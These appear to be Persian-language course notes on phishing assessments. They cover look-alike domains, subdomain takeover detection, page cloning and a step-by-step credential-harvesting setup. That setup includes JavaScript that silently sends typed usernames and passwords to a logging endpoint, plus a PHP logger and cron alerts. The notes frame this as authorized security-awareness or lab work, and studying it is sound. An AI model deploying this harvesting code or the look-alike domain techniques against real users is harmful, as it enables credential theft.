
![[Pasted image 20260916001243.png]]



خط‌به‌خط:

- **Legitimate? Maybe...**  
    «واقعی و قانونی است؟ شاید...»
    
- **Look at the URL carefully**  
    URL را با دقت بررسی کن. مثلاً Domain واقعاً متعلق به سرویس موردنظر هست یا نه.
    
- **Look at the source code**  
    Source Code صفحه را بررسی کن.
    
- **Review the resources being loaded on the page**  
    ببین صفحه چه Resourceهایی را Load می‌کند؛ مثل JavaScript، CSS، Image و سایر فایل‌ها و اینکه از چه Domainهایی دریافت می‌شوند.
    
- **Where is your data being POSTed to?**  
    مهم‌ترین قسمت: اطلاعاتی که در Form وارد می‌کنی، با درخواست **HTTP POST** به کجا ارسال می‌شوند؟
    

مثلاً:

```text
Login Form
    ↓
POST /login
    ↓
example.com
```

یا ممکن است:

```text
Fake Login Page
      ↓
POST
      ↓
attacker-controlled server
```

---

جمله‌ی آخر می‌گوید:

> بیشتر کاربران آن‌قدر تخصص فنی ندارند که بتوانند یک Phishing Page را تشخیص دهند، به شرطی که مهاجم:
> 
> **(a)** صفحه‌ای را که کاربر انتظار دارد ببیند تقریباً کاملاً Clone کند، و  
> **(b)** یک Domain انتخاب کند که از نظر ظاهری خیلی شبیه Domain واقعی باشد.

مثلاً به‌صورت مفهومی:

```text
Legitimate:
login.example.com

Look-alike:
login-example.com
```

بنابراین نکته‌ی اصلی این اسلاید از دید **Threat Hunting** این است:

**فقط ظاهر صفحه را بررسی نکن؛ URL، Source Code، Loaded Resources و مقصد POST Request را هم بررسی کن.**

در یک Lab مجاز، این دقیقاً همان جاهایی هستند که می‌توانی برای Detection رویشان Telemetry و Hunting بسازی.



> **«هدف Phishing شما کدام سرویس است؟»**

یعنی قبل از ساخت صفحه و Infrastructure باید مشخص شود قرار است **کاربر را به سمت چه سرویسی** هدایت کنی.

مواردی که مثال زده:

### 📧 Email

سرویس‌های ایمیل:

- **OWA 365** → Outlook Web App / Outlook on the Web در Microsoft 365
    
- **Gmail** → سرویس ایمیل Google
    

مثلاً سناریو می‌تواند یک **Fake Login Page** شبیه صفحه Login سرویس ایمیل باشد.

### 🔐 VPN

مثلاً:

- **Citrix**
    
- **Cisco**
    

یعنی هدف صفحه Phishing می‌تواند صفحه Authentication مربوط به VPN سازمان باشد.

### 🌐 External Web Application

یعنی یک Web Application که از اینترنت قابل دسترسی است.

مثلاً:

```text
Internet
   ↓
Web Application
   ↓
Login
```

### 🏢 Internal Web Application

یعنی یک Web Application داخلی سازمان که معمولاً فقط کاربران داخل شبکه به آن دسترسی دارند.

---

پس ساختار کلی اسلاید:

```text
What service are you targeting?
             │
     ┌───────┴────────┐
     ↓                ↓
   Email              VPN
     │                │
 OWA / Gmail      Citrix / Cisco
     │
     └───────┬────────┘
             ↓
       Web Application
       ├── External
       └── Internal
```

خلاصه‌ی همین متن اینه:

> **قبل از اجرای Phishing باید مشخص کنی سرویس هدف (Target Service) چیست.**

یعنی مثلاً:

```text
Target Service
     │
     ├── Email
     │    ├── OWA 365
     │    └── Gmail
     │
     ├── VPN
     │    ├── Citrix
     │    └── Cisco
     │
     ├── External Web Application
     │
     └── Internal Web Application
```

یعنی **Phishing فقط مختص Email نیست**؛ ممکنه سناریو برای یک **VPN Login** یا **Web Application Login** هم طراحی بشه.

مثلاً در یک **Authorized Security Awareness / Purple-Team Exercise**، سازمان ممکنه بگه:

> «می‌خواهیم مقاومت کاربران در برابر صفحه Login جعلی سرویس VPN خودمان را آزمایش کنیم.»

در نتیجه **Target Service = VPN** خواهد بود.

پس نکته‌ی اصلی اسلاید:

**اول Target Service را مشخص کن → بعد Phishing Page و Infrastructure را متناسب با همان سرویس طراحی کن.**



دقیقاً. **MXToolbox برای مشاهده و بررسی بخش زیادی از DNS و Email Infrastructure یک Domain** استفاده می‌شود.

مثلاً یک Domain را بررسی می‌کنی:

```text
example.com
     │
     ├── DNS
     │    ├── A / AAAA
     │    ├── MX
     │    ├── TXT
     │    ├── NS
     │    └── PTR
     │
     └── Email Security
          ├── SPF
          ├── DKIM
          └── DMARC
```

اما یک نکته مهم:

**MXToolbox همه‌ی زیرساخت را به تو نشان نمی‌دهد.** فقط اطلاعاتی را می‌بینی که از طریق DNS و سرویس‌های عمومی قابل مشاهده‌اند.

مثلاً:

```text
MX → Mail Serverهای اعلام‌شده
SPF → Policy ارسال ایمیل
DMARC → Policy احراز هویت
DNS → Recordهای Public
PTR → Reverse DNS
```

ولی مواردی مثل **IP داخلی، ساختار Internal Network، سرورهای پشت Firewall یا تنظیمات داخلی Mail Server** معمولاً از این طریق قابل مشاهده نیستند.




![[Pasted image 20260916005259.png]]


این بخش درباره‌ی **Subdomain Takeover** است؛ یعنی حالتی که یک **Subdomain سازمان به یک سرویس/Domain خارجی اشاره می‌کند، ولی آن مقصد دیگر توسط سازمان کنترل نمی‌شود**.

مثال متن:

فرض کن سازمان این را دارد:

```text
promotion.domain.com
        │
        │ CNAME
        ▼
promotion-company.com
```

یعنی وقتی کاربر می‌رود به:

```text
promotion.domain.com
```

DNS می‌گوید مقصد واقعی این Subdomain، `promotion-company.com` است.

حالا فرض کن سازمان `promotion-company.com` را تمدید نکند و Domain منقضی شود:

```text
promotion.domain.com
        │
        │ CNAME
        ▼
promotion-company.com   ❌ Expired
```

مشکل اینجاست که سازمان هنوز CNAME را پاک نکرده.

اگر شخص دیگری بتواند آن Domain منقضی‌شده را ثبت کند:

```text
Attacker
   │
   └── registers promotion-company.com
                 │
                 ▼
        promotion.domain.com
```

در نتیجه ممکن است کاربر همچنان با **Subdomain معتبر سازمان** وارد سایتی شود که حالا مقصد آن تحت کنترل شخص دیگری است.

### چرا خطرناک است؟

چون URL همچنان ظاهراً معتبر است:

```text
https://promotion.domain.com
```

کاربر ممکن است به آن اعتماد کند، در حالی که Backend/Destination دیگر تحت کنترل سازمان نیست.

متن می‌گوید مهاجم می‌تواند از این وضعیت برای **credential harvesting** استفاده کند؛ یعنی مثلاً یک صفحه جعلی Login روی آن مقصد قرار دهد و اطلاعات واردشده را جمع‌آوری کند.

### نکته اصلی برای Threat Hunting

چیزی که باید بررسی شود:

```text
Subdomain
    ↓
CNAME
    ↓
External Service / Domain
    ↓
آیا مقصد هنوز تحت کنترل سازمان است؟
```

پس **Subdomain Takeover لزوماً به معنی هک DNS نیست**؛ معمولاً مشکل از یک **DNS configuration قدیمی + resource/domain رهاشده** به وجود می‌آید.

مثلاً در یک سازمان، وجود تعداد زیادی:

```text
dev.domain.com
test.domain.com
promo.domain.com
old.domain.com
```

که به سرویس‌های Cloud قدیمی CNAME شده‌اند، می‌تواند از نظر امنیتی نیازمند بررسی باشد.





![[Pasted image 20260916011757.png]]


اینجا دارد یک **Workflow برای پیدا کردن Subdomain Takeover** معرفی می‌کند.

منطقش این است:

```text
Target Domain
      ↓
Subdomain Enumeration
      ↓
List of Subdomains
      ↓
Takeover Detection
      ↓
Potentially Vulnerable Subdomains
```

### مرحله اول: پیدا کردن Subdomainها

چند ابزار معرفی کرده:

- **Sublist3r**
    
- **OWASP Amass**
    
- **Subfinder**
    

مثلاً نتیجه Enumeration می‌تواند چیزی شبیه این باشد:

```text
www.example.com
dev.example.com
test.example.com
promo.example.com
old.example.com
```

### مرحله دوم: بررسی Takeover

بعد لیست Subdomainها را به ابزارهایی مثل:

- **takeover**
    
- **tko-subs**
    

می‌دهی تا بررسی کنند آیا یکی از این Subdomainها به یک **External Service / Cloud Resource** اشاره می‌کند که احتمالاً دیگر توسط سازمان کنترل نمی‌شود.

مثلاً:

```text
promo.example.com
       │
       │ CNAME
       ▼
old-project.cloud-provider.com
       │
       └── Resource no longer exists ❌
```

ابزار می‌تواند چنین موردی را به‌عنوان **Potential Takeover** علامت‌گذاری کند.

### پس تفاوت ابزارها

```text
Subfinder / Amass / Sublist3r
        ↓
«چه Subdomainهایی وجود دارند؟»

takeover / tko-subs
        ↓
«آیا بعضی از این Subdomainها
احتمالاً Takeoverable هستند؟»
```

یعنی **Enumeration → Detection**.

نکته مهم: خروجی ابزارهای Takeover معمولاً به معنی «قطعی هک‌پذیر بودن» نیست؛ باید **CNAME/DNS، وضعیت سرویس مقصد و مالکیت Resource** به‌صورت دستی تأیید شود.



### Typosquatting

**Typosquatting** تکنیکی است که در آن مهاجم یک **Domain مشابه Domain اصلی** ثبت می‌کند تا از اشتباه تایپی کاربر هنگام وارد کردن URL سوءاستفاده کند.

```text
Legitimate Domain:
fortynorthsecurity.com

Typosquatted Domains:
fortynorhtsecurity.com   ← جابه‌جایی حروف
fortynorthsecurty.com    ← حذف یک حرف
```

**هدف:** کاربر متوجه تفاوت جزئی Domain نشود و وارد سایت جعلی شود.

```text
User
 ↓
Typing Error
 ↓
Typosquatted Domain
 ↓
Fake / Phishing Page
```

**نکته:**  
Typosquatting ≠ Subdomain Takeover

- **Typosquatting** → سوءاستفاده از اشتباه تایپی و ثبت Domain مشابه
    
- **Subdomain Takeover** → سوءاستفاده از Subdomainای که به یک Resource رهاشده اشاره می‌کند.


### Adding Common Words

در این تکنیک، مهاجم به‌جای تغییر حروف Domain اصلی، **کلمات رایج و مرتبط با سرویس هدف** را به نام Domain اضافه می‌کند تا Domain جعلی برای کاربر معتبر به نظر برسد.

#### 📧 هدف: Email

کلمات رایج:

```text
mail
email
```

مثال:

```text
fortynorthsecurity.com
        ↓
fortynorthsecurityemail.com
fortynorthmail.com
```

#### 🔐 هدف: VPN

کلمات مرتبط:

```text
vpn
intranet
```

مثال:

```text
fortynorthsecurity.com
        ↓
fortynorthvpn.com
fortynorthintranet.com
```

### ایده اصلی

```text
Legitimate Domain
        ↓
Add a familiar keyword
        ↓
Similar-looking Domain
        ↓
User may mistake it for the legitimate service
```

**تفاوت با Typosquatting:**  
در **Typosquatting** معمولاً اشتباه تایپی یا تغییر جزئی در Domain ایجاد می‌شود؛ اما در **Adding Common Words** کلمات مرتبط مثل `mail`، `email`، `vpn` یا `intranet` به Domain اضافه می‌شوند.


### Change the TLD

**TLD (Top-Level Domain)** بخش انتهایی یک Domain است.

مثلاً:

```text
fortynorthsecurity.com
                  ↑
                 TLD
```

نمونه‌های رایج:

```text
.com
.net
.org
```

در این تکنیک، به‌جای استفاده از همان TLD اصلی، یک **TLD متفاوت** انتخاب می‌شود.

مثلاً:

```text
Legitimate:
fortynorthsecurity.com

Different TLD:
fortynorthsecurity.org
```

ایده این است که نام اصلی Domain حفظ شود ولی **پسوند Domain تغییر کند**.

```text
Original Domain
       ↓
Change TLD
       ↓
Similar Domain
```

**نکته:** تغییر TLD به‌تنهایی به معنی معتبر بودن Domain جدید نیست؛ `fortynorthsecurity.org` و `fortynorthsecurity.com` می‌توانند کاملاً **دو Domain مستقل با مالکیت متفاوت** باشند.



### NameMesh

**NameMesh**
یک ابزار برای **Domain Name Generation** است که از روی یک نام یا عبارت، پیشنهادهای مختلف برای Domain تولید می‌کند.

مثلاً اگر نام هدف را وارد کنی:

```text
fortynorthsecurity
        ↓
    NameMesh
        ↓
┌─────────────────────────┐
│ Similar Names            │
│ Different TLDs           │
│ Added Words              │
│ Variations               │
│ Combined Words           │
└─────────────────────────┘
```

متن می‌گوید:

> **NameMesh کار خلاقانه انتخاب نام را برایت انجام می‌دهد.**  
> کافی است نام موردنظر را در Search Bar وارد کنی؛ ابزار مجموعه‌ای از Domainهای مختلف و مشابه با آن عبارت را پیشنهاد می‌دهد.

در چارچوب این درس، هدفش این است که **روش‌های مختلف ساخت Domain مشابه یک نام اصلی** را سریع‌تر پیدا کنی؛ مثلاً برای بررسی و شناسایی Domainهای look-alike در یک **Authorized Phishing Assessment**.

### Cloning with SingleFile

اینجا درباره‌ی **Clone کردن یک Web Page برای استفاده در Lab / Authorized Phishing Assessment** صحبت می‌کند.

متن می‌گوید در یک پروژه، ابزار **WGET** نتوانسته صفحه را درست Clone کند؛ چون بخشی از **JavaScript**ها بعد از تمام شدن اجرای WGET Load می‌شدند و در نتیجه نسخه‌ی Clone شده ظاهر مناسبی نداشت.

بعد با **SingleFile** آشنا شدند؛ یک Extension برای **Chrome/Firefox** که صفحه را به شکل متفاوتی ذخیره می‌کند.

### مزیت اصلی

SingleFile کل صفحه را تا حد زیادی در **یک فایل HTML** ذخیره می‌کند:

```text
Web Page
   │
   ├── HTML
   ├── CSS
   ├── Images
   └── Resources
          ↓
     SingleFile
          ↓
     one.html
```

یعنی مشکل Dependency بین فایل‌های مختلف کمتر می‌شود.

همچنین بعضی تصاویر را به‌صورت **Base64** داخل خود HTML/CSS قرار می‌دهد:

```text
Image
  ↓
Base64
  ↓
HTML/CSS
```

### Downsides

نقطه‌ضعفش این است که ساختار Directory اصلی را حفظ نمی‌کند.

مثلاً به‌جای:

```text
page/
├── index.html
├── css/
├── js/
└── images/
```

ممکن است نتیجه بیشتر شبیه این باشد:

```text
page.html
```

و Assetها داخل همان فایل قرار گرفته باشند.

### خلاصه جزوه

> **SingleFile:** Browser Extension برای ذخیره/Clone کردن یک Web Page به‌صورت یک فایل HTML مستقل. بسیاری از Resourceها مثل Images و CSS را داخل همان فایل Embed می‌کند و وابستگی به فایل‌های جداگانه را کاهش می‌دهد؛ اما ساختار Directory اصلی صفحه را حفظ نمی‌کند.



![[Pasted image 20260916015132.png]]

![[Pasted image 20260916015143.png]]


![[Pasted image 20260916015153.png]]


![[Pasted image 20260916015222.png]]


![[Pasted image 20260916015229.png]]


### Credential Harvesting چیست؟

**Credential Harvesting = جمع‌آوری Credentials از کاربر**

Credentials می‌تواند شامل مواردی مثل:

- Username
    
- Password
    
- Session Token / Cookie
    
- MFA-related information
    
- Recovery codes
    

باشد.

مثلاً کاربر انتظار دارد وارد Microsoft 365 شود:

```text
User
  ↓
Fake Login Page
  ↓
Username + Password
  ↓
Credential captured
```

صفحه Fake ممکن است از نظر ظاهری بسیار شبیه صفحه واقعی باشد؛ بنابراین صرفاً دیدن Logo یا ظاهر صفحه برای تشخیص کافی نیست.

---

### تفاوت Credential Harvesting با Phishing

**Phishing** یک مفهوم گسترده‌تر است.

یعنی مهاجم با استفاده از یک پیام، ایمیل، لینک، فایل یا روش مشابه تلاش می‌کند کاربر را فریب دهد.

اما **Credential Harvesting** مشخصاً روی **گرفتن اطلاعات احراز هویت** تمرکز دارد.

مثلاً:

```text
Phishing
   │
   ├── Malicious Attachment
   ├── Malware Delivery
   ├── Credential Harvesting
   └── Other Social Engineering
```

پس:

> Credential Harvesting می‌تواند یکی از اهداف یا تکنیک‌های مورد استفاده در یک Phishing Campaign باشد.

---

### یک نکته مهم

Credential Harvesting لزوماً به معنی گرفتن مستقیم Password نیست.

مثلاً در بعضی حملات، هدف ممکن است دستیابی به:

```text
Username
Password
     ↓
Authentication
     ↓
Session / Token
```

باشد.

یعنی حتی اگر Password مستقیماً به دست نیاید، سرقت یک **Session Token** می‌تواند در بعضی سناریوها برای سوءاستفاده از یک Session احراز‌شده اهمیت داشته باشد.

### **Evilginx:** An Adversary-in-the-Middle (AiTM) phishing framework that can relay a legitimate authentication flow and capture credentials and authenticated session tokens/cookies.

:::writing{variant="document" id="58321" title="Capturing Credentials — جمع‌آوری Credentials"}
### Capturing Credentials — جمع‌آوری Credentials

**Step 1:**
فرم موجود در صفحه‌ی Clone‌شده را که قصد دریافت اطلاعات از آن را دارید، انتخاب کنید.

**Step 2:**
یک JavaScript برای ثبت Credentials و سپس Forward کردن درخواست/Response آن به Server واقعی اضافه کنید.

**Step 3:**
یک PHP در سمت Server ایجاد کنید تا Credentials دریافت و جمع‌آوری شوند.

**Step 4:**
وب‌سایت را در مسیر `/var/www/html` آپلود کنید.

**Step 5:** 
Permissionهای Server را به‌گونه‌ای تنظیم کنید که از Credentialsهای ثبت‌شده محافظت شود.

**Step 6:** 
یک Cronjob ایجاد کنید تا هنگام ثبت Credentials جدید، از طریق Email به شما اطلاع دهد.

**Step 7:**
سرویس Apache را Start کنید.


![[Pasted image 20260916020300.png]]


![[Pasted image 20260916020310.png]]



### Adding JavaScript to Log Credentials

- هدف در **Credential Harvesting** این است که Credentials کاربر به‌صورت **Seamless** ثبت شوند، بدون اینکه کاربر متوجه فعالیت مشکوکی شود.
    
- **Key Idea:** پس از ثبت Credentials، رفتار مورد انتظار کاربر همچنان باید ادامه پیدا کند تا فرآیند برای او غیرعادی به نظر نرسد.
    
- از **JavaScript** برای دو مرحله استفاده می‌شود:
    
    1. ثبت و ذخیره‌ی Credentials
        
    2. Forward کردن درخواست **POST** اصلی به Server واقعی
        
- **Downside:** اگر کاربر در اولین تلاش Password اشتباهی وارد کند، به صفحه‌ی واقعی **"Incorrect login"** در Server اصلی هدایت می‌شود.
    
- مانند بسیاری از مسائل فنی، می‌توان این رفتار را تغییر داد؛ اما انجام آن نیازمند **JavaScript سفارشی برای هر Engagement** است.


```javascript
<script>
	function logItNow(callback) {
		console.log("in here");
		var http = new XMLHttpRequest();
		var url = '/owa/auth.php';
		var params = 'username=' + document.getElementById("userNameInput") .value
		&password='+ document.getElementById("passwordInput").value;
		http.open('POST', url, true);
		http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		http.send(params);
		setTimeout(function() {
		
		callback();
	}, 1200) ;
	}
	function submitItNow() {
		document.forms["loginForm"].submit();
	}
</script>
<script>
	function beforeSubmit() {
	logItNow(submitItNow);
	return false;

</script>
```


### JavaScript Credential Logging

هدف این کد، اجرای دو عملیات هنگام Submit شدن فرم Login است:

1. ارسال مقادیر واردشده در Username و Password به یک Endpoint مشخص برای ثبت آن‌ها.
    
2. سپس Submit کردن فرم Login و ادامه دادن فرآیند اصلی.
    

#### ساختار کلی

```text
User submits Login Form
        ↓
beforeSubmit()
        ↓
logItNow()
        ↓
Read Username + Password
        ↓
POST request to /owa/auth.php
        ↓
Wait ~1200 ms
        ↓
submitItNow()
        ↓
Submit original Login Form
```

#### بخش‌های اصلی کد

**`logItNow(callback)`**

تابع اصلی برای ثبت اطلاعات است و یک `callback` دریافت می‌کند تا بعد از پایان عملیات اجرا شود.

**`XMLHttpRequest`**

برای ایجاد یک HTTP Request از سمت Browser استفاده شده است:

```javascript
var http = new XMLHttpRequest();
```

**خواندن مقادیر فرم**

کد با استفاده از `getElementById()` مقدار فیلدهای Username و Password را از DOM دریافت می‌کند:

```javascript
document.getElementById("userNameInput").value
document.getElementById("passwordInput").value
```

**ارسال POST Request**

درخواست به Endpoint زیر ارسال می‌شود:

```text
/owa/auth.php
```

و Content-Type آن به شکل زیر تعیین شده است:

```text
application/x-www-form-urlencoded
```

**`setTimeout()`**

پس از ارسال Request، حدود `1200 ms` صبر می‌کند و سپس Callback را اجرا می‌کند.

**`submitItNow()`**

این تابع فرم Login اصلی را Submit می‌کند:

```javascript
document.forms["loginForm"].submit();
```

**`beforeSubmit()`**

این تابع ترتیب اجرای دو عملیات را مشخص می‌کند:

```text
beforeSubmit()
    ↓
logItNow()
    ↓
submitItNow()
```

یعنی ابتدا عملیات ثبت اطلاعات انجام می‌شود و سپس فرم اصلی Submit می‌شود.

> **نکته:** کدی که در متن فرستادی از نظر Syntax چند ایراد دارد، بنابراین به‌احتمال زیاد بخشی از نمونه هنگام Copy/Paste ناقص شده است. مفهوم کلی آن همان Flow بالا است.

![[Pasted image 20260916022712.png]]




### Edit Form Submit

- باید از **Submit شدن پیش‌فرض Form** جلوگیری شود و به‌جای آن، ابتدا تابع `beforeSubmit()` اجرا شود.
    
- تابع `beforeSubmit()` ابتدا Credentials را ثبت می‌کند و سپس فرآیند Submit عادی Form را ادامه می‌دهد.
    

```html
onsubmit="return beforeSubmit();"
```

یعنی:

```text
Form Submit
    ↓
beforeSubmit()
    ↓
Credential Logging
    ↓
Normal Form Submission
```


### Edit Form Submit

- گاهی دکمه‌ی **Submit** در HTML با تگ `button` پیاده‌سازی نشده است و ممکن است از `span` یا `div` استفاده شده باشد.
    
- در این حالت، دو گزینه وجود دارد:
    

**روش اول — دشوارتر:**

- عنصر موجود را به یک `button` تبدیل کنید.
    
- سپس **CSS** مربوط به آن را متناسب با ساختار جدید اصلاح کنید.
    

**روش دوم — ساده‌تر:**

- Attribute زیر را از تگ `<form>` حذف کنید:
    

```html
onsubmit="return beforeSubmit();"
```

- سپس به عنصر مربوط به Button، Attribute زیر را اضافه کنید:
    

```html
onclick="return beforeSubmit();"
```

در این حالت، اجرای `beforeSubmit()` به جای رویداد **form submission**، مستقیماً با رویداد **click** روی عنصر انجام می‌شود.




### The Code (PHP)

این PHP در نمونه‌ی دوره برای دریافت و ذخیره‌سازی داده‌هایی استفاده می‌شود که از طریق **HTTP POST** ارسال شده‌اند.

#### منطق کلی کد

```text
POST Request
     ↓
Check username + password
     ↓
Create "username:password" string
     ↓
Write data to data.txt
     ↓
Append to existing file
     ↓
Return write status
```

#### بخش‌های اصلی

**`$_POST`**

برای دسترسی به داده‌هایی استفاده می‌شود که در یک **POST Request** ارسال شده‌اند.

**`isset()`**

بررسی می‌کند که آیا فیلدهای موردنظر در Request وجود دارند یا خیر:

```php
isset($_POST['username'])
isset($_POST['password'])
```

**ساخت Data**

مقادیر Username و Password با `:` از یکدیگر جدا شده و در یک String قرار می‌گیرند:

```text
username:password
```

**`file_put_contents()`**

برای نوشتن Data داخل فایل استفاده می‌شود:

```text
/var/www/html/log/data.txt
```

پارامترهای استفاده‌شده:

- `FILE_APPEND` → داده‌ی جدید را به انتهای فایل اضافه می‌کند و محتوای قبلی را حفظ می‌کند.
    
- `LOCK_EX` → هنگام نوشتن، فایل را به‌صورت Exclusive Lock قفل می‌کند تا از تداخل هم‌زمان در عملیات نوشتن جلوگیری شود.
    

**بررسی نتیجه**

اگر عملیات نوشتن با خطا مواجه شود:

```text
There was an error writing this file
```

نمایش داده می‌شود.

در غیر این صورت، تعداد **bytes** نوشته‌شده گزارش می‌شود.

اگر هیچ POST Dataای وجود نداشته باشد نیز پیام:

```text
no post data to process
```

نمایش داده می‌شود.

> **نکته:** کدی که در اسلاید فرستادی چند خطای Syntax/Formatting دارد؛ مثلاً `<? php`، `$ POST` و چند `{}` ناقص. بنابراین ساختار بالا منطق موردنظر کد را توضیح می‌دهد، نه اینکه عیناً یک نسخه‌ی قابل اجرا از آن باشد.




![[Pasted image 20260916023134.png]]


![[Pasted image 20260916023246.png]]


### Securing Logged Credentials

- فرض کنید Credentials ثبت‌شده در فایل زیر ذخیره می‌شوند:
    

```text
/var/www/html/log/data.txt
```

- برای جلوگیری از **Inadvertent Disclosure** و افشای ناخواسته‌ی Credentials، باید Configuration مربوط به **Apache2** را تنظیم کرد.
    
- برای Directory زیر باید دسترسی HTTP با دستور زیر محدود شود:
    

```text
Require all denied
```

این تنظیم باعث می‌شود محتوای Directory مربوط به `log` از طریق Web Server برای Clientها قابل دسترسی نباشد.

- فایل پیش‌فرض Configuration مربوط به Virtual Host در Apache2 در مسیر زیر قرار دارد:
    

```text
/etc/apache2/sites-available/000-default.conf
```

**هدف اصلی:** جلوگیری از این وضعیت:

```text
Client
  ↓ HTTP Request
/var/www/html/log/data.txt
  ↓
Credential Disclosure
```

با اعمال Access Control مناسب، فایل Log نباید مستقیماً از طریق HTTP قابل دریافت باشد.


![[Pasted image 20260916025415.png]]


![[Pasted image 20260916025436.png]]


![[Pasted image 20260916032440.png]]


![[Pasted image 20260916032458.png]]

### Securing Logged Credentials with SSL

- اگر Website از **SSL Certificate** استفاده کند، فرآیند محافظت از مسیر `/log` همچنان مشابه حالت HTTP است.
    
- یعنی حتی در صورت استفاده از **HTTPS** نیز باید Access Control مربوط به Directory حاوی Logها تنظیم شود تا فایل‌های حساس از طریق Web قابل دسترسی نباشند.
    
- فایل پیش‌فرض Configuration مربوط به **SSL Virtual Host** در Apache2 در مسیر زیر قرار دارد:
    

```text
/etc/apache2/sites-available/default-ssl.conf
```

**نکته:** استفاده از HTTPS ارتباط بین Client و Server را رمزنگاری می‌کند، اما به‌تنهایی مانع دسترسی HTTP به فایل‌های داخل Web Root نمی‌شود؛ بنابراین **TLS/SSL** و **Access Control** دو موضوع جداگانه هستند.



### Bash Script to Check for New Credentials

برای ارسال Notification از **SendGrid Mail API** استفاده می‌شود. در این روش یک **API Key** اختصاصی برای این کار ایجاد می‌شود.

> این روش به‌دلیل ملاحظات **OPSEC**، خود Credentials ثبت‌شده را از طریق Email ارسال نمی‌کند.

### منطق Script

1. از محتوای فایل حاوی Credentials یک **MD5 Hash** گرفته می‌شود.
    
2. این Hash در Directory زیر ذخیره می‌شود:
    

```text
/tmp
```

3. هر **5 دقیقه**، Script مجدداً از محتوای Log یک Hash جدید ایجاد می‌کند.
    
4. Hash جدید با Hash قبلی که در `/tmp` ذخیره شده مقایسه می‌شود.
    
5. اگر دو Hash یکسان باشند:
    

```text
Old Hash == New Hash
        ↓
No Action
```

6. اگر Hashها متفاوت باشند:
    

```text
Old Hash != New Hash
        ↓
New Data Detected
        ↓
Send Email Notification
```

### ایده اصلی

در واقع Script به‌جای بررسی مستقیم محتوای Credentials، تغییر در **محتوای Log** را با استفاده از Hash تشخیص می‌دهد.

```text
Logged Data
    ↓
MD5 Hash
    ↓
Compare with Previous Hash
    ↓
 ┌───────────────┐
 │ Same          │ Different
 ↓               ↓
No Action        Email Alert
```

- این روش تنها یک راهکار ساده برای تشخیص تغییرات است و روش‌های بهتر و دقیق‌تری نیز برای انجام این کار وجود دارد.

![[Pasted image 20260916033012.png]]


### Creating a Cronjob

- ابتدا **Bash Script** را در یک مسیر مشخص ذخیره کنید و **Full Path** آن را یادداشت کنید.
    
- دستور زیر را اجرا کنید:
    

```bash
crontab -e
```

- این دستور **Cronjob Editor** را باز می‌کند. ممکن است برای اجرای آن به **sudo privileges** نیاز داشته باشید.
    
- در صورت درخواست، **Editor** موردنظر خود را انتخاب کنید.
    
- به انتهای فایل **crontab** بروید و یک Cronjob اضافه کنید:
    

```bash
*/5 * * * * /usr/bin/bash /path/to/cron/script.sh >/dev/null 2>&1
```

### مفهوم Cron Expression

```text
*/5 * * * *
```

یعنی Script **هر ۵ دقیقه یک‌بار** اجرا شود.

بخش:

```text
/usr/bin/bash /path/to/cron/script.sh
```

یعنی Binary مربوط به Bash اجرا شده و Script مشخص‌شده به‌عنوان Argument به آن داده می‌شود.

و:

```text
>/dev/null 2>&1
```

یعنی خروجی معمولی (**stdout**) و خطاها (**stderr**) دور ریخته شوند و در خروجی Cron نمایش داده نشوند.

### خلاصه

```text
Cron
 ↓
Every 5 minutes
 ↓
Execute Bash Script
 ↓
Discard stdout/stderr
```



### Editing the `/etc/hosts`

از داخل **Terminal**:

```bash
vi /etc/hosts
```

فایل `hosts` را با ویرایشگر **vi** باز می‌کند.

سپس:

```text
G
```

برای رفتن به **انتهای فایل**.

```text
i
```

برای ورود به **Insert Mode** و اضافه کردن متن.

سپس دو بار `Enter` بزنید تا چند خط فاصله ایجاد شود.

خط زیر را اضافه کنید:

```text
127.0.0.1 yourphishingdomain.com
```

این خط باعث می‌شود Domain مشخص‌شده به **Loopback Address** یعنی `127.0.0.1` resolve شود.

در نهایت:

```text
:wq!
```

و سپس `Enter`:

- `w` → Write / Save
    
- `q` → Quit
    
- `!` → Force
    

![[Pasted image 20260917013115.png]]


![[Pasted image 20260917013642.png]]

آره. **Social-Engineer Toolkit (SET)** یک فریم‌ورک Open Source برای **Security Awareness، Social Engineering و Penetration Testing** است که بیشتر در Kali Linux استفاده می‌شود.

![Image](https://images.openai.com/static-rsc-4/1b27uvPJJ0aeSis54GjQmftv9St9rPDB6MiRylX2fDr4fiIcQZrO4dQsQiKoAOp_I2pWKNn4XaT2ko0-Zzgn_YH1LvrRKn3bfN-anJrfAEV7i7hHdgcnGJxShLr6r46nHoMGUD5gXdppIVaTyW-sj3sHb0Al1wW5td1FiyIll-5ppZYt70TtiGM35O4jTJpH?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/O8MiN8FU9JVzjrNllgqZmpPdgHihiC8y5afTDvXV2z_YQa54FNqICDUgL30rrbO6Vywo1jcAqS6hVrc687oPvhsahX93uHZ0rBGatOKI8dRvm6_gy9hRauvav4x-woEZAyrKL9oNfaJXsCxarb0S012HOWEZAUg3zTO6DOaB7xvufmVW79CABDE1xvcf8Avc?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/LLitY7DHdenBV3xVKxxH_a9c6KqQEIHVsSs0AuUzQeI0UCLwvTLi19p1NOrBv53gRlvlzklej1SzS9kql3GN4RGrvWxORtDtOVhq5FBdjMICN0OxvYE6g86q-B_zuqROTGpvQFP82CW_vZqGAM2jsSOL2a7ihTuzbXZI-YAbsE8rz3b1t8LJ5wTaUuyKQz6H?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/kilbRdHbZOD4IBTa4RX5IdNFNuWDaexbiAbzG53uSeI2pREEAr5xlKZm73_AcsmxyLgo53VNfdejfI0I6OQIYlwG4gw5ZL_h7vjcayMmWy4fZofxBz9oYMbIYqc2X6WCzPHPkPnMcuT4XCyL4ZuSIOJwb7_0a-5MMshe5Ytb6PtLnJaDUENa8zR2em6BT6h1?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/V7RvYrUQm-8GTHgbSTLzliNOduWTxvUIWSxmYjknJEA7ehHKykfzx5DLdCBk1tbOTaVl4Y786e_5nmqwk_IaJiBf5-uklAL1DERFScafwldl0BQ2XgWC81--PdKi41DP0QF7J881Lxi0ZDnFlBTSD1JrE3EUVmwlhzB2ZWmY4sA5yJXKtxCo0tt5zXKfWPNA?purpose=fullsize)

